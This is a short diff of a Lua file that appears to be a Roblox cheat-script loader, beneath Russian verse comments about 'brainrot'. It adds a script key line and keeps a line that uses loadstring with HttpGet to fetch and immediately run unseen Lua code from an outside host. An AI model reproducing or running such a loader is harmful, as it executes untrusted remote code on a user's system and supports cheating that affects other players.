@@ -27,4 +27,5 @@
 --За окном brainrot, уже стучится в двери
 --Всех детишек украдёт, кто ему поверит ]] --
 
+getgenv().SCRIPT_KEY="5f693979-5b28-43db-ab1a-613c8079b947";
 loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/dd1158e38b24a493ba853d47404ef032b0da43ed74516acfb013072bff14b304/download"))()
